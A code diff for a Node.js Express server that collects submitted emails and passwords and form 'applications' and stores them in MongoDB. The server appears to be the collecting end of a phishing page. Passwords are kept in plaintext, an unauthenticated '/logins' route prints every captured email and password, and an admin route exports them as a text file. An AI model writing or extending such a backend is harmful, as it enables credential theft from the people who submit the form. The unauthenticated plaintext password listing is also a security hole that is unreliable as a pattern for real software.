@@ -1,8 +1,8 @@
 const express = require('express');
 const bodyParser = require('body-parser');
 const cors = require('cors');
-const fs = require('fs');
 const path = require('path');
+const mongoose = require('mongoose'); // ✅ Added for MongoDB
 
 const app = express();
 app.use(cors());
@@ -12,67 +12,115 @@ app.use(bodyParser.urlencoded({ extended: true }));
 // Serve static files (optional)
 app.use(express.static(path.join(__dirname, '../')));
 
-// Save login info
-app.post('/save-login', (req, res) => {
+//
+// ✅ STEP 1: Connect to MongoDB Atlas
+//
+const MONGO_URI = "mongodb+srv://<username>:<password>@cluster0.xxxxxx.mongodb.net/ac_corp?retryWrites=true&w=majority";
+
+mongoose.connect(MONGO_URI)
+  .then(() => console.log("✅ Connected to MongoDB Atlas"))
+  .catch((err) => console.error("❌ MongoDB connection error:", err));
+
+//
+// ✅ STEP 2: Define Schemas and Models
+//
+const loginSchema = new mongoose.Schema({
+  email: String,
+  password: String,
+  createdAt: { type: Date, default: Date.now }
+});
+
+const applicationSchema = new mongoose.Schema({
+  form: Object,
+  createdAt: { type: Date, default: Date.now }
+});
+
+const Login = mongoose.model('Login', loginSchema);
+const Application = mongoose.model('Application', applicationSchema);
+
+//
+// ✅ STEP 3: Save login info to MongoDB
+//
+app.post('/save-login', async (req, res) => {
   const { email, password } = req.body;
   if (!email || !password)
     return res.status(400).send({ error: 'Missing email or password' });
 
-  // append to file
-  fs.appendFileSync('logins.txt', `Email: ${email}, Password: ${password}\n`);
-
-  // log a short, useful line for Live Tail (avoid printing raw passwords to logs)
-  console.log(`[LOGIN SAVED] ${new Date().toISOString()} email=${email}`);
-  // If you really need to log password (not recommended), do:
-  // console.log(`[LOGIN SAVED] ${new Date().toISOString()} email=${email} password=${password}`);
-
-  res.send({ status: 'ok' });
+  try {
+    await Login.create({ email, password });
+    console.log(`[LOGIN SAVED] ${new Date().toISOString()} email=${email}`);
+    res.send({ status: 'ok' });
+  } catch (err) {
+    console.error("❌ Error saving login:", err);
+    res.status(500).send({ error: 'Database error' });
+  }
 });
 
-
-// Save application form
-app.post('/save-application', (req, res) => {
-  const form = req.body;
-  fs.appendFileSync('applications.json', JSON.stringify(form) + '\n');
-  res.send({ status: 'ok' });
+//
+// ✅ STEP 4: Save application form to MongoDB
+//
+app.post('/save-application', async (req, res) => {
+  try {
+    await Application.create({ form: req.body });
+    console.log("[APPLICATION SAVED]");
+    res.send({ status: 'ok' });
+  } catch (err) {
+    console.error("❌ Error saving application:", err);
+    res.status(500).send({ error: 'Database error' });
+  }
 });
 
-// View saved logins (for testing)
-app.get('/logins', (req, res) => {
-  const data = fs.existsSync('logins.txt')
-    ? fs.readFileSync('logins.txt', 'utf-8')
-    : '';
-  res.send(`<pre>${data}</pre>`);
+//
+// ✅ STEP 5: View saved logins (for testing)
+//
+app.get('/logins', async (req, res) => {
+  try {
+    const logins = await Login.find().sort({ createdAt: -1 });
+    const formatted = logins.map(l => `Email: ${l.email}, Password: ${l.password}`).join('\n');
+    res.send(`<pre>${formatted}</pre>`);
+  } catch (err) {
+    res.status(500).send('Error loading logins');
+  }
 });
 
-// View saved applications (for testing)
-app.get('/applications', (req, res) => {
-  const data = fs.existsSync('applications.json')
-    ? fs.readFileSync('applications.json', 'utf-8')
-    : '';
-  res.send(`<pre>${data}</pre>`);
+//
+// ✅ STEP 6: View saved applications (for testing)
+//
+app.get('/applications', async (req, res) => {
+  try {
+    const apps = await Application.find().sort({ createdAt: -1 });
+    res.send(`<pre>${JSON.stringify(apps, null, 2)}</pre>`);
+  } catch (err) {
+    res.status(500).send('Error loading applications');
+  }
 });
 
-// 🔒 Secure admin-only download route
-const ADMIN_TOKEN = process.env.ADMIN_TOKEN; // Set this in Render dashboard
+//
+// ✅ STEP 7: Secure admin-only download route
+//
+const ADMIN_TOKEN = process.env.ADMIN_TOKEN; // Set in Render dashboard
 
-app.get('/admin/download-login-file', (req, res) => {
+app.get('/admin/download-login-file', async (req, res) => {
   const token = req.headers['x-admin-token'] || req.query.token;
   if (!ADMIN_TOKEN || token !== ADMIN_TOKEN) {
     return res.status(401).send('Unauthorized');
   }
 
-  const filePath = path.join(__dirname, 'logins.txt');
-  if (!fs.existsSync(filePath)) return res.status(404).send('Not found');
-
-  res.download(filePath, 'logins.txt', (err) => {
-    if (err) {
-      console.error('Download error', err);
-      if (!res.headersSent) res.status(500).send('Error sending file');
-    }
-  });
+  try {
+    const logins = await Login.find().sort({ createdAt: -1 });
+    const content = logins.map(l => `Email: ${l.email}, Password: ${l.password}`).join('\n');
+    res.setHeader('Content-Disposition', 'attachment; filename=logins.txt');
+    res.setHeader('Content-Type', 'text/plain');
+    res.send(content);
+  } catch (err) {
+    console.error('❌ Error generating file:', err);
+    res.status(500).send('Server error');
+  }
 });
 
+//
+// ✅ STEP 8: Start the server
+//
 app.listen(3000, () =>
   console.log('✅ Server running at http://localhost:3000')
 );
